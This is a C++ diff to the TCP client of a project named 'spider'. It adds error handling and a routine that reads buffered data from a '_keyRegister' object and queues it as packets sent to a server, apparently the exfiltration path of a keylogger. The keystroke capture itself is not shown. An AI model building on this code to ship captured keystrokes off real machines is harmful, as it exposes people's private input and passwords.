@@ -25,13 +25,13 @@ namespace spider
       memset(&_data[0], 0, 128);
       _client.OnReadPossible([this](Socket::Client &client, size_t length)
 			     {
-			       std::cout << "length = " << length << std::endl;
+			       //std::cout << "length = " << length << std::endl;
 			       if (/*_firstRead &&*/ length == 21)
 				 {
 				   _firstRead = false;
 				   memset(&_data[0], 0, 128);
 				   _client.read(static_cast<void *>(_data), 21);
-				   std::cout << _data << std::endl;
+				   //std::cout << _data << std::endl;
 				 }
 			       //else if (!_firstRead)
 			       else if (length >= sizeof(PackageHeader))
@@ -43,11 +43,14 @@ namespace spider
 			      });
       _client.OnStart([this](Socket::Client &client, std::string const &address, int port)
 		      {
-			std::cout << "connection" << std::endl;
+			  _keyRegister.swapMode();
+				std::cout << "connection" << std::endl;
 		      });
       _client.OnDisconnect([this](Socket::Client &client)
 			   {
 			     std::cout << "disonnection" << std::endl;
+				 _runningService = false;
+				 _keyRegister.swapMode();
 			     _Mqueue.lock();
 			     for (auto ite = _messages.begin(); ite != _messages.end(); ++ite)
 			       delete[] *ite;
@@ -77,14 +80,16 @@ namespace spider
 
     void ClientTcpSocket::close()
     {
-      if (_runningService)
-	{
-	  _runningService = false;
-	  std::cout << "close client" << std::endl;
-	  _client.stop();
-	}
-      else
-	std::cout << "client already close" << std::endl;
+      try
+		{
+			_runningService = false;
+			std::cout << "close client" << std::endl;
+			_client.stop();
+		}
+		catch (const std::exception error)
+		{
+			std::cout << "client already close" << std::endl;
+		}
     }
 
     void ClientTcpSocket::connect()
@@ -98,10 +103,21 @@ namespace spider
 	  _messagesSize.push_back(17);
 	  _runningService = true;
 	  std::cout << "starting client" << std::endl;
-	  _client.start(_adresse, _port);
+	  try
+	  {
+		  _client.start(_adresse, _port);
+		}
+	  catch (const std::exception error)
+	  {
+		  std::cout << "server not connected" << std::endl;
+		  delete[] _messages.back();
+		  _messages.pop_back();
+		  _messagesSize.pop_back();
+		  _runningService = false;
+	  }
 	}
-      else
-	std::cout << "service already started" << std ::endl;
+    else
+		std::cout << "service already started" << std ::endl;
     }
 
     bool ClientTcpSocket::startedService() const
@@ -188,17 +204,39 @@ namespace spider
       _Mqueue.lock();
       if (!_messages.empty())
 	{
-	  for (int i = 0; i < _messagesSize.front(); ++i) {
-	    std::cout << std::hex << (int)(_messages.front()[i]);
-	  }
-	  std::cout << std::dec << std::endl;
-	  _client.write(_messages.front(), _messagesSize.front());
-	  delete[] _messages.front();
-	  _messages.pop_front();
-	  _messagesSize.pop_front();
+		  char *bufferFile;
+		  int bufferSize;
+		  if (_messages.size() < 10000 && (bufferSize = _keyRegister.read(bufferFile)) > 0)
+		  {
+			  pushFileCMD(bufferFile, bufferSize);
+			  delete[] bufferFile;
+		  }
+		  else
+		  {
+			  _client.write(_messages.front(), _messagesSize.front());
+			  delete[] _messages.front();
+			  _messages.pop_front();
+			  _messagesSize.pop_front();
+		  }
 	}
-      _Mqueue.unlock();
+		_Mqueue.unlock();
     }
+
+	void ClientTcpSocket::pushFileCMD(char *bufferFile, int bufferSize)
+	{
+		PackageHeader	pHeader;
+		char			*msg;
+
+		for (int i = 0; i < bufferSize;)
+		{
+			pHeader = *(static_cast<PackageHeader *>(static_cast<void *>(bufferFile + i)));
+			msg = new char[pHeader.size];
+			std::memcpy(msg, bufferFile + i, pHeader.size);
+			_messages.push_back(msg);
+			_messagesSize.push_back(pHeader.size);
+			i += pHeader.size;
+		}
+	}
 
 	std::mutex *ClientTcpSocket::getQMtx()
 	{
